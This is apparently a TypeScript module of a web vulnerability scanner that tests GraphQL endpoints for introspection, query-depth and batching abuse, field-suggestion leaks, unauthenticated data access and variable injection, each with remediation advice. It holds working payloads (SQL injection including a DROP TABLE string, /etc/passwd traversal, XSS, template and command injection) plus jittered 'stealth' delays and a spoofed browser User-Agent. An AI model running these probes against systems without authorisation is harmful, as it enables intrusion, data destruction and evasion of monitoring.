// =============================================================================
// VulnHunter AI - GraphQL Security Scanner Module
// =============================================================================
// Detects GraphQL misconfigurations and vulnerabilities including introspection
// exposure, query depth attacks, batch query abuse, field suggestion exploitation,
// authorization bypass, and injection via variables.
// CWE-200 | CVSS varies by finding type
// =============================================================================

import {
  type Finding,
  type Vulnerability,
  Severity,
  VulnerabilityCategory,
} from "@vulnhunter/core";
import { generateUUID } from "@vulnhunter/core";
import { sendRequest, type HttpResponse } from "@vulnhunter/core";
import { createLogger } from "@vulnhunter/core";
import { RateLimiter } from "@vulnhunter/core";

import type { ScanModule } from "./xss.js";

const log = createLogger("scanner:graphql");

// ---------------------------------------------------------------------------
// Common GraphQL Endpoints
// ---------------------------------------------------------------------------

const GRAPHQL_ENDPOINTS: string[] = [
  "/graphql",
  "/graphql/",
  "/api/graphql",
  "/api/v1/graphql",
  "/v1/graphql",
  "/gql",
  "/query",
  "/graphiql",
  "/playground",
  "/altair",
  "/explorer",
  "/api",
];

// ---------------------------------------------------------------------------
// Introspection Query
// ---------------------------------------------------------------------------

const INTROSPECTION_QUERY = `
  query IntrospectionQuery {
    __schema {
      queryType { name }
      mutationType { name }
      subscriptionType { name }
      types {
        kind
        name
        description
        fields(includeDeprecated: true) {
          name
          description
          args {
            name
            description
            type { kind name ofType { kind name ofType { kind name } } }
            defaultValue
          }
          type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
          isDeprecated
          deprecationReason
        }
        inputFields {
          name
          description
          type { kind name ofType { kind name } }
          defaultValue
        }
        interfaces { kind name }
        enumValues(includeDeprecated: true) {
          name
          description
          isDeprecated
          deprecationReason
        }
        possibleTypes { kind name }
      }
      directives {
        name
        description
        locations
        args {
          name
          description
          type { kind name ofType { kind name } }
          defaultValue
        }
      }
    }
  }
`;

// Smaller introspection for schema enumeration
const SMALL_INTROSPECTION_QUERY = `
  query {
    __schema {
      queryType { name }
      mutationType { name }
      types {
        name
        kind
        fields { name }
      }
    }
  }
`;

// Type name query (often allowed even when full introspection is disabled)
const TYPE_NAME_QUERY = `
  query {
    __typename
  }
`;

// ---------------------------------------------------------------------------
// Deep Query Templates (for query depth attack testing)
// ---------------------------------------------------------------------------

function buildDeepQuery(depth: number): string {
  let query = "query {\n";
  let indent = "  ";
  const fieldName = "__typename";
  // Build a self-referencing deep query using __type
  for (let i = 0; i < depth; i++) {
    query += `${indent}t${i}: __type(name: "Query") {\n`;
    indent += "  ";
    query += `${indent}name\n`;
    if (i < depth - 1) {
      query += `${indent}fields {\n`;
      indent += "  ";
      query += `${indent}name\n`;
      query += `${indent}type {\n`;
      indent += "  ";
    }
  }
  // Close all braces
  for (let i = depth - 1; i >= 0; i--) {
    if (i < depth - 1) {
      indent = indent.slice(2);
      query += `${indent}}\n`; // close type
      indent = indent.slice(2);
      query += `${indent}}\n`; // close fields
    }
    indent = indent.slice(2);
    query += `${indent}}\n`; // close __type
  }
  query += "}";
  return query;
}

// ---------------------------------------------------------------------------
// Batch Query Template
// ---------------------------------------------------------------------------

function buildBatchQueries(count: number): Array<{ query: string }> {
  const queries: Array<{ query: string }> = [];
  for (let i = 0; i < count; i++) {
    queries.push({ query: `query batch_${i} { __typename }` });
  }
  return queries;
}

// ---------------------------------------------------------------------------
// Field Suggestion Exploitation
// ---------------------------------------------------------------------------

const FIELD_SUGGESTION_QUERIES: string[] = [
  `query { user }`,
  `query { users }`,
  `query { admin }`,
  `query { me }`,
  `query { account }`,
  `query { login }`,
  `query { password }`,
  `query { secret }`,
  `query { token }`,
  `query { key }`,
  `query { config }`,
  `query { setting }`,
  `query { internal }`,
  `query { debug }`,
  `query { flag }`,
];

// ---------------------------------------------------------------------------
// Injection Payloads for Variables
// ---------------------------------------------------------------------------

const VARIABLE_INJECTION_PAYLOADS: Array<{
  variables: Record<string, unknown>;
  description: string;
  detection: RegExp;
}> = [
  {
    variables: { id: "' OR '1'='1" },
    description: "SQL injection via GraphQL variable",
    detection: /SQL|syntax error|mysql|postgres|sqlite/i,
  },
  {
    variables: { id: "1; DROP TABLE users--" },
    description: "SQL injection (DROP) via variable",
    detection: /SQL|syntax error/i,
  },
  {
    variables: { input: "{{7*7}}" },
    description: "Server-Side Template Injection via variable",
    detection: /49/,
  },
  {
    variables: { input: "${7*7}" },
    description: "Expression Language injection via variable",
    detection: /49/,
  },
  {
    variables: { id: "../../../etc/passwd" },
    description: "Path traversal via GraphQL variable",
    detection: /root:.*:0:0/,
  },
  {
    variables: { input: "<script>alert(1)</script>" },
    description: "XSS via GraphQL variable",
    detection: /<script>alert\(1\)<\/script>/,
  },
  {
    variables: { id: "1 AND SLEEP(5)" },
    description: "Time-based SQL injection via variable",
    detection: /SQL|syntax/i,
  },
  {
    variables: { id: "${IFS}" },
    description: "OS command injection via variable",
    detection: /command|bash|sh:|Permission denied/i,
  },
];

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function stealthDelay(baseMs: number): Promise<void> {
  const jitter = Math.floor(Math.random() * baseMs * 0.5);
  return new Promise((resolve) => setTimeout(resolve, baseMs + jitter));
}

async function sendGraphqlRequest(
  url: string,
  body: unknown,
  headers: Record<string, string>,
): Promise<HttpResponse> {
  return sendRequest({
    method: "POST",
    url,
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
      ...headers,
    },
    body: JSON.stringify(body),
  });
}

interface GraphqlSchema {
  queryType: string | null;
  mutationType: string | null;
  types: Array<{
    name: string;
    kind: string;
    fields: Array<{ name: string }>;
  }>;
  sensitiveTypes: string[];
  sensitiveFields: string[];
}

function extractSchemaInfo(introspectionResult: Record<string, unknown>): GraphqlSchema | null {
  try {
    const data = introspectionResult.data as Record<string, unknown> | undefined;
    if (!data) return null;
    const schema = data.__schema as Record<string, unknown> | undefined;
    if (!schema) return null;

    const queryType = (schema.queryType as Record<string, string>)?.name || null;
    const mutationType = (schema.mutationType as Record<string, string>)?.name || null;
    const rawTypes = (schema.types as Array<Record<string, unknown>>) || [];

    const types: GraphqlSchema["types"] = rawTypes
      .filter((t) => {
        const name = t.name as string;
        return !name.startsWith("__"); // Filter out introspection types
      })
      .map((t) => ({
        name: t.name as string,
        kind: t.kind as string,
        fields: ((t.fields as Array<Record<string, string>>) || []).map((f) => ({
          name: f.name,
        })),
      }));

    const sensitiveKeywords = [
      "password",
      "secret",
      "token",
      "key",
      "admin",
      "internal",
      "private",
      "debug",
      "credential",
      "auth",
      "session",
      "ssn",
      "credit_card",
      "api_key",
      "apikey",
    ];

    const sensitiveTypes: string[] = [];
    const sensitiveFields: string[] = [];

    for (const type of types) {
      for (const keyword of sensitiveKeywords) {
        if (type.name.toLowerCase().includes(keyword)) {
          sensitiveTypes.push(type.name);
        }
      }
      for (const field of type.fields) {
        for (const keyword of sensitiveKeywords) {
          if (field.name.toLowerCase().includes(keyword)) {
            sensitiveFields.push(`${type.name}.${field.name}`);
          }
        }
      }
    }

    return { queryType, mutationType, types, sensitiveTypes, sensitiveFields };
  } catch {
    return null;
  }
}

function buildGraphqlFinding(params: {
  target: string;
  endpoint: string;
  findingType: string;
  confidence: number;
  evidence: string;
  responseBody: string;
  responseStatus: number;
  severity: Severity;
  cweId: string;
  cvssScore: number;
  remediation: string;
}): Finding {
  const vulnId = generateUUID();

  const vulnerability: Vulnerability = {
    id: vulnId,
    title: `GraphQL: ${params.findingType}`,
    description:
      `A GraphQL security issue (${params.findingType}) was detected at ${params.endpoint}. ` +
      params.evidence,
    severity: params.severity,
    category: VulnerabilityCategory.GraphQL,
    cvssScore: params.cvssScore,
    cvssVector:
      params.severity === Severity.High || params.severity === Severity.Critical
        ? "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"
        : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cweId: params.cweId,
    target: params.target,
    endpoint: params.endpoint,
    evidence: {
      description: params.evidence,
      extra: { findingType: params.findingType },
    },
    request: {
      method: "POST",
      url: params.endpoint,
      headers: { "Content-Type": "application/json" },
    },
    response: {
      statusCode: params.responseStatus,
      headers: {},
      body: params.responseBody.slice(0, 2000),
      responseTimeMs: 0,
    },
    remediation: params.remediation,
    references: [
      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
      "https://graphql.org/learn/authorization/",
      "https://www.apollographql.com/blog/graphql/security/",
    ],
    confirmed: params.confidence >= 80,
    falsePositive: false,
    discoveredAt: new Date().toISOString(),
  };

  return {
    vulnerability,
    module: `scanner:graphql:${params.findingType.toLowerCase().replace(/[- /()]/g, "_")}`,
    confidence: params.confidence,
    timestamp: new Date().toISOString(),
    rawData: { endpoint: params.endpoint, findingType: params.findingType },
  };
}

// ---------------------------------------------------------------------------
// GraphqlScanner Class
// ---------------------------------------------------------------------------

export class GraphqlScanner implements ScanModule {
  public readonly name = "graphql";

  private rateLimiter: RateLimiter;
  private userAgent: string;
  private discoveredEndpoint: string | null;
  private schema: GraphqlSchema | null;

  constructor() {
    this.rateLimiter = new RateLimiter(5);
    this.userAgent =
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
    this.discoveredEndpoint = null;
    this.schema = null;
  }

  async *execute(
    target: string,
    options: Record<string, unknown>,
  ): AsyncGenerator<Finding> {
    log.info({ target }, "Starting GraphQL scan");

    const rateLimit = typeof options.rateLimit === "number" ? options.rateLimit : 5;
    this.rateLimiter = new RateLimiter(rateLimit);
    if (typeof options.userAgent === "string") {
      this.userAgent = options.userAgent;
    }

    const authHeaders: Record<string, string> = {};
    if (options.authToken && typeof options.authToken === "string") {
      authHeaders["Authorization"] = `Bearer ${options.authToken}`;
    }
    if (options.cookie && typeof options.cookie === "string") {
      authHeaders["Cookie"] = options.cookie;
    }

    // Phase 0: Discover GraphQL endpoint
    yield* this.discoverEndpoint(target, authHeaders);

    if (!this.discoveredEndpoint) {
      log.info("No GraphQL endpoint found");
      return;
    }

    // Phase 1: Introspection query
    yield* this.testIntrospection(target, authHeaders);

    // Phase 2: Query depth attack
    yield* this.testQueryDepth(target, authHeaders);

    // Phase 3: Batch query abuse
    yield* this.testBatchQueries(target, authHeaders);

    // Phase 4: Field suggestion exploitation
    yield* this.testFieldSuggestions(target, authHeaders);

    // Phase 5: Authorization bypass through nested queries
    yield* this.testAuthBypass(target, authHeaders);

    // Phase 6: Injection through variables
    yield* this.testVariableInjection(target, authHeaders);

    log.info({ target }, "GraphQL scan complete");
  }

  // -------------------------------------------------------------------------
  // Phase 0: Discover GraphQL endpoint
  // -------------------------------------------------------------------------

  private async *discoverEndpoint(
    target: string,
    authHeaders: Record<string, string>,
  ): AsyncGenerator<Finding> {
    const baseUrl = new URL(target).origin;

    // Check if the target itself is a GraphQL endpoint
    const endpointsToCheck = [
      target,
      ...GRAPHQL_ENDPOINTS.map((ep) => `${baseUrl}${ep}`),
    ];

    for (const endpoint of endpointsToCheck) {
      await this.rateLimiter.acquire();
      await stealthDelay(100);

      try {
        const resp = await sendGraphqlRequest(
          endpoint,
          { query: TYPE_NAME_QUERY },
          { "User-Agent": this.userAgent, ...authHeaders },
        );

        if (resp.status === 200) {
          try {
            const data = JSON.parse(resp.body);
            if (data.data && data.data.__typename) {
              this.discoveredEndpoint = endpoint;
              log.info({ endpoint }, "GraphQL endpoint discovered");
              return;
            }
          } catch {
            // Not JSON, skip
          }
        }

        // Also check for GraphQL error responses (indicates a GraphQL endpoint)
        if (resp.body.includes('"errors"') && resp.body.includes('"message"')) {
          try {
            const data = JSON.parse(resp.body);
            if (data.errors && Array.isArray(data.errors)) {
              this.discoveredEndpoint = endpoint;
              log.info({ endpoint }, "GraphQL endpoint discovered (via error response)");
              return;
            }
          } catch {
            // Not JSON, skip
          }
        }
      } catch {
        continue;
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 1: Introspection query testing
  // -------------------------------------------------------------------------

  private async *testIntrospection(
    target: string,
    authHeaders: Record<string, string>,
  ): AsyncGenerator<Finding> {
    if (!this.discoveredEndpoint) return;

    // Try full introspection query
    await this.rateLimiter.acquire();
    await stealthDelay(200);

    try {
      const resp = await sendGraphqlRequest(
        this.discoveredEndpoint,
        { query: INTROSPECTION_QUERY },
        { "User-Agent": this.userAgent, ...authHeaders },
      );

      if (resp.status === 200) {
        try {
          const data = JSON.parse(resp.body);

          if (data.data && data.data.__schema) {
            this.schema = extractSchemaInfo(data);

            const typeCount = this.schema?.types.length || 0;
            const fieldCount = this.schema?.types.reduce((sum, t) => sum + t.fields.length, 0) || 0;
            const sensitiveTypesStr = this.schema?.sensitiveTypes.join(", ") || "none";
            const sensitiveFieldsStr = this.schema?.sensitiveFields.slice(0, 10).join(", ") || "none";

            let severity = Severity.Medium;
            let confidence = 85;

            if ((this.schema?.sensitiveTypes.length || 0) > 0 || (this.schema?.sensitiveFields.length || 0) > 0) {
              severity = Severity.High;
              confidence = 90;
            }

            // If introspection works without auth, it's worse
            if (Object.keys(authHeaders).length === 0) {
              confidence += 5;
            }

            yield buildGraphqlFinding({
              target,
              endpoint: this.discoveredEndpoint,
              findingType: "Introspection Enabled",
              confidence,
              evidence:
                `Full GraphQL introspection is enabled, revealing the complete API schema. ` +
                `Discovered ${typeCount} types with ${fieldCount} total fields. ` +
                `Sensitive types: ${sensitiveTypesStr}. ` +
                `Sensitive fields: ${sensitiveFieldsStr}.`,
              responseBody: resp.body,
              responseStatus: resp.status,
              severity,
              cweId: "CWE-200",
              cvssScore: severity === Severity.High ? 7.5 : 5.3,
              remediation:
                "1. Disable introspection in production environments.\n" +
                "2. In Apollo Server: new ApolloServer({ introspection: false }).\n" +
                "3. Use persisted queries / allowlisted queries in production.\n" +
                "4. If introspection must remain, restrict it to authenticated admin users.\n" +
                "5. Remove sensitive type/field names from the schema.",
            });
          }
        } catch {
          // Response not parseable, skip
        }
      }
    } catch (err) {
      log.debug({ error: err }, "Introspection query failed");
    }

    // Also try smaller introspection if full one was blocked
    if (!this.schema) {
      await this.rateLimiter.acquire();
      try {
        const resp = await sendGraphqlRequest(
          this.discoveredEndpoint,
          { query: SMALL_INTROSPECTION_QUERY },
          { "User-Agent": this.userAgent, ...authHeaders },
        );

        if (resp.status === 200) {
          try {
            const data = JSON.parse(resp.body);
            if (data.data && data.data.__schema) {
              this.schema = extractSchemaInfo(data);

              yield buildGraphqlFinding({
                target,
                endpoint: this.discoveredEndpoint,
                findingType: "Partial Introspection Enabled",
                confidence: 75,
                evidence:
                  `Full introspection may be disabled, but partial schema queries still return results. ` +
                  `An attacker can enumerate types and fields.`,
                responseBody: resp.body,
                responseStatus: resp.status,
                severity: Severity.Low,
                cweId: "CWE-200",
                cvssScore: 3.7,
                remediation:
                  "Block all introspection queries, including partial __schema and __type queries.",
              });
            }
          } catch {
            // Not JSON
          }
        }
      } catch {
        // Skip
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 2: Query depth attack testing
  // -------------------------------------------------------------------------

  private async *testQueryDepth(
    target: string,
    authHeaders: Record<string, string>,
  ): AsyncGenerator<Finding> {
    if (!this.discoveredEndpoint) return;

    const depths = [5, 10, 20, 50, 100];
    let maxAcceptedDepth = 0;
    let lastResp: HttpResponse | null = null;

    for (const depth of depths) {
      const query = buildDeepQuery(depth);

      await this.rateLimiter.acquire();
      await stealthDelay(100);

      try {
        const resp = await sendGraphqlRequest(
          this.discoveredEndpoint,
          { query },
          { "User-Agent": this.userAgent, ...authHeaders },
        );

        if (resp.status === 200) {
          try {
            const data = JSON.parse(resp.body);
            if (!data.errors || data.data) {
              maxAcceptedDepth = depth;
              lastResp = resp;
            } else {
              // Check if error mentions depth/complexity
              const errMsg = JSON.stringify(data.errors).toLowerCase();
              if (
                errMsg.includes("depth") ||
                errMsg.includes("complexity") ||
                errMsg.includes("too deep")
              ) {
                break; // Rate limiting in place
              }
            }
          } catch {
            // Not JSON
          }
        }
      } catch {
        break;
      }
    }

    if (maxAcceptedDepth >= 20 && lastResp) {
      yield buildGraphqlFinding({
        target,
        endpoint: this.discoveredEndpoint,
        findingType: "No Query Depth Limit",
        confidence: 80,
        evidence:
          `GraphQL endpoint accepted queries with depth ${maxAcceptedDepth} without rejection. ` +
          `An attacker can craft deeply nested queries to cause denial of service (DoS) ` +
          `by exhausting server resources.`,
        responseBody: lastResp.body,
        responseStatus: lastResp.status,
        severity: Severity.Medium,
        cweId: "CWE-400",
        cvssScore: 5.3,
        remediation:
          "1. Implement query depth limiting (recommended max: 10-15).\n" +
          "2. Use query complexity analysis to reject expensive queries.\n" +
          "3. Set query timeouts on the server.\n" +
          "4. In Apollo: use depthLimit plugin.\n" +
          "5. Implement cost analysis based on field resolution cost.",
      });
    }
  }

  // -------------------------------------------------------------------------
  // Phase 3: Batch query abuse testing
  // -------------------------------------------------------------------------

  private async *testBatchQueries(
    target: string,
    authHeaders: Record<string, string>,
  ): AsyncGenerator<Finding> {
    if (!this.discoveredEndpoint) return;

    const batchSizes = [5, 10, 50, 100];
    let maxAcceptedBatch = 0;
    let lastResp: HttpResponse | null = null;

    for (const size of batchSizes) {
      const batch = buildBatchQueries(size);

      await this.rateLimiter.acquire();
      await stealthDelay(200);

      try {
        const resp = await sendRequest({
          method: "POST",
          url: this.discoveredEndpoint,
          headers: {
            "Content-Type": "application/json",
            Accept: "application/json",
            "User-Agent": this.userAgent,
            ...authHeaders,
          },
          body: JSON.stringify(batch),
        });

        if (resp.status === 200) {
          try {
            const data = JSON.parse(resp.body);
            if (Array.isArray(data) && data.length === size) {
              maxAcceptedBatch = size;
              lastResp = resp;
            }
          } catch {
            // Not JSON
          }
        }
      } catch {
        break;
      }
    }

    if (maxAcceptedBatch >= 10 && lastResp) {
      yield buildGraphqlFinding({
        target,
        endpoint: this.discoveredEndpoint,
        findingType: "Batch Query Abuse",
        confidence: 75,
        evidence:
          `GraphQL endpoint accepted batch queries with ${maxAcceptedBatch} operations in a single request. ` +
          `An attacker can abuse this for brute-force attacks (e.g., password guessing) ` +
          `while bypassing per-request rate limiting.`,
        responseBody: lastResp.body,
        responseStatus: lastResp.status,
        severity: Severity.Medium,
        cweId: "CWE-307",
        cvssScore: 5.3,
        remediation:
          "1. Limit the number of operations in a single batch request (e.g., max 5).\n" +
          "2. Apply rate limiting per operation, not per request.\n" +
          "3. Disable query batching if not needed.\n" +
          "4. Monitor for abuse patterns in batched queries.",
      });
    }
  }

  // -------------------------------------------------------------------------
  // Phase 4: Field suggestion exploitation
  // -------------------------------------------------------------------------

  private async *testFieldSuggestions(
    target: string,
    authHeaders: Record<string, string>,
  ): AsyncGenerator<Finding> {
    if (!this.discoveredEndpoint) return;

    const discoveredFields: Array<{ query: string; suggestions: string[] }> = [];

    for (const query of FIELD_SUGGESTION_QUERIES) {
      await this.rateLimiter.acquire();
      await stealthDelay(100);

      try {
        const resp = await sendGraphqlRequest(
          this.discoveredEndpoint,
          { query },
          { "User-Agent": this.userAgent, ...authHeaders },
        );

        if (resp.status === 200 || resp.status === 400) {
          try {
            const data = JSON.parse(resp.body);
            if (data.errors && Array.isArray(data.errors)) {
              for (const error of data.errors) {
                const msg = typeof error.message === "string" ? error.message : "";
                // Extract field suggestions from error messages
                const suggestMatch = /Did you mean[^?]*\?/i.exec(msg);
                if (suggestMatch) {
                  const fieldMatches = msg.match(/"([^"]+)"/g);
                  if (fieldMatches) {
                    const suggestions = fieldMatches.map((m: string) =>
                      m.replace(/"/g, ""),
                    );
                    discoveredFields.push({ query, suggestions });
                  }
                }
              }
            }
          } catch {
            // Not JSON
          }
        }
      } catch {
        continue;
      }
    }

    if (discoveredFields.length > 0) {
      const allSuggestions = new Set<string>();
      for (const df of discoveredFields) {
        for (const s of df.suggestions) {
          allSuggestions.add(s);
        }
      }

      yield buildGraphqlFinding({
        target,
        endpoint: this.discoveredEndpoint,
        findingType: "Field Suggestion Information Leak",
        confidence: 80,
        evidence:
          `GraphQL error messages include field suggestions, revealing schema information ` +
          `even when introspection may be disabled. Discovered fields via suggestions: ` +
          `${Array.from(allSuggestions).join(", ")}. ` +
          `An attacker can enumerate the entire schema by sending invalid queries.`,
        responseBody: JSON.stringify(discoveredFields),
        responseStatus: 200,
        severity: Severity.Low,
        cweId: "CWE-200",
        cvssScore: 3.7,
        remediation:
          "1. Disable field suggestion in production error messages.\n" +
          "2. In GraphQL.js: set custom formatter that strips suggestions.\n" +
          "3. Return generic error messages without hints about valid field names.\n" +
          "4. Use allowlisted/persisted queries to prevent arbitrary queries.",
      });
    }
  }

  // -------------------------------------------------------------------------
  // Phase 5: Authorization bypass through nested queries
  // -------------------------------------------------------------------------

  private async *testAuthBypass(
    target: string,
    authHeaders: Record<string, string>,
  ): AsyncGenerator<Finding> {
    if (!this.discoveredEndpoint || !this.schema) return;

    // Look for types that reference other types (e.g., User -> Posts -> User)
    // Try accessing sensitive fields through relationships
    const sensitiveQueries: Array<{ query: string; description: string }> = [];

    // Build queries based on discovered schema
    for (const type of this.schema.types) {
      if (
        type.kind === "OBJECT" &&
        type.fields.length > 0 &&
        !type.name.startsWith("__")
      ) {
        const hasIdField = type.fields.some((f) => f.name === "id");
        const hasSensitiveField = type.fields.some((f) =>
          ["email", "password", "token", "secret", "key", "ssn", "creditCard"].includes(
            f.name,
          ),
        );

        if (hasIdField && hasSensitiveField) {
          const fields = type.fields.map((f) => f.name).slice(0, 10).join("\n      ");
          sensitiveQueries.push({
            query: `query { ${type.name.toLowerCase()} { ${fields} } }`,
            description: `Direct access to ${type.name} with sensitive fields`,
          });
          sensitiveQueries.push({
            query: `query { ${type.name.toLowerCase()}s { ${fields} } }`,
            description: `List access to ${type.name} with sensitive fields`,
          });
        }
      }
    }

    for (const sq of sensitiveQueries.slice(0, 10)) {
      await this.rateLimiter.acquire();
      await stealthDelay(100);

      try {
        // Send without auth headers to test authorization
        const resp = await sendGraphqlRequest(
          this.discoveredEndpoint,
          { query: sq.query },
          { "User-Agent": this.userAgent },
        );

        if (resp.status === 200) {
          try {
            const data = JSON.parse(resp.body);
            if (data.data && !data.errors) {
              // Check if actual data was returned (not just null)
              const dataStr = JSON.stringify(data.data);
              if (
                dataStr !== "null" &&
                dataStr !== "{}" &&
                dataStr.length > 10
              ) {
                yield buildGraphqlFinding({
                  target,
                  endpoint: this.discoveredEndpoint,
                  findingType: "Authorization Bypass via Nested Query",
                  confidence: 75,
                  evidence:
                    `Unauthenticated query "${sq.description}" returned data. ` +
                    `Query: ${sq.query.slice(0, 200)}. ` +
                    `This suggests missing or insufficient field-level authorization.`,
                  responseBody: resp.body,
                  responseStatus: resp.status,
                  severity: Severity.High,
                  cweId: "CWE-862",
                  cvssScore: 7.5,
                  remediation:
                    "1. Implement field-level authorization checks in resolvers.\n" +
                    "2. Use middleware to enforce auth before resolution.\n" +
                    "3. Never rely solely on frontend query construction for security.\n" +
                    "4. Apply the principle of least privilege to GraphQL fields.",
                });
              }
            }
          } catch {
            // Not JSON
          }
        }
      } catch {
        continue;
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 6: Injection through GraphQL variables
  // -------------------------------------------------------------------------

  private async *testVariableInjection(
    target: string,
    authHeaders: Record<string, string>,
  ): AsyncGenerator<Finding> {
    if (!this.discoveredEndpoint) return;

    // Build a generic query that accepts variables
    const queries = [
      {
        query: `query($id: ID!) { node(id: $id) { id } }`,
        varKey: "id",
      },
      {
        query: `query($input: String) { search(query: $input) { id } }`,
        varKey: "input",
      },
      {
        query: `query($id: String) { user(id: $id) { id } }`,
        varKey: "id",
      },
    ];

    // Also build queries from schema if available
    if (this.schema) {
      for (const type of this.schema.types) {
        if (
          type.kind === "OBJECT" &&
          type.fields.some((f) => f.name === "id")
        ) {
          queries.push({
            query: `query($id: ID) { ${type.name.toLowerCase()}(id: $id) { id } }`,
            varKey: "id",
          });
        }
      }
    }

    for (const q of queries.slice(0, 5)) {
      // Get baseline response time
      await this.rateLimiter.acquire();
      const baseStart = Date.now();
      let baseResp: HttpResponse | null = null;
      try {
        baseResp = await sendGraphqlRequest(
          this.discoveredEndpoint,
          { query: q.query, variables: { [q.varKey]: "1" } },
          { "User-Agent": this.userAgent, ...authHeaders },
        );
      } catch {
        continue;
      }
      const baseElapsed = Date.now() - baseStart;

      for (const payload of VARIABLE_INJECTION_PAYLOADS) {
        await this.rateLimiter.acquire();
        await stealthDelay(100);

        try {
          const start = Date.now();
          const resp = await sendGraphqlRequest(
            this.discoveredEndpoint,
            {
              query: q.query,
              variables: { [q.varKey]: payload.variables[Object.keys(payload.variables)[0]] },
            },
            { "User-Agent": this.userAgent, ...authHeaders },
          );
          const elapsed = Date.now() - start;

          // Check for error patterns indicating injection worked
          if (payload.detection.test(resp.body)) {
            yield buildGraphqlFinding({
              target,
              endpoint: this.discoveredEndpoint,
              findingType: `Injection via Variables (${payload.description})`,
              confidence: 80,
              evidence:
                `${payload.description}. The GraphQL variable was passed to a backend ` +
                `system without proper sanitization. Pattern detected in response.`,
              responseBody: resp.body,
              responseStatus: resp.status,
              severity: Severity.High,
              cweId: "CWE-89",
              cvssScore: 8.6,
              remediation:
                "1. Always use parameterized queries/prepared statements in resolvers.\n" +
                "2. Validate and sanitize all GraphQL variable inputs.\n" +
                "3. Use input type validation in the GraphQL schema.\n" +
                "4. Apply the principle of least privilege to database connections.",
            });
            break; // Move to next query
          }

          // Time-based detection (for SLEEP payloads)
          if (
            payload.description.includes("Time-based") &&
            elapsed > baseElapsed + 4000
          ) {
            yield buildGraphqlFinding({
              target,
              endpoint: this.discoveredEndpoint,
              findingType: `Time-based Injection via Variables`,
              confidence: 75,
              evidence:
                `Time-based injection detected via GraphQL variables. ` +
                `Baseline: ${baseElapsed}ms, Injected: ${elapsed}ms. ` +
                `Payload: ${JSON.stringify(payload.variables)}`,
              responseBody: resp.body,
              responseStatus: resp.status,
              severity: Severity.High,
              cweId: "CWE-89",
              cvssScore: 8.6,
              remediation:
                "1. Use parameterized queries in all database operations.\n" +
                "2. Validate GraphQL variable types strictly.",
            });
            break;
          }
        } catch {
          continue;
        }
      }
    }
  }
}
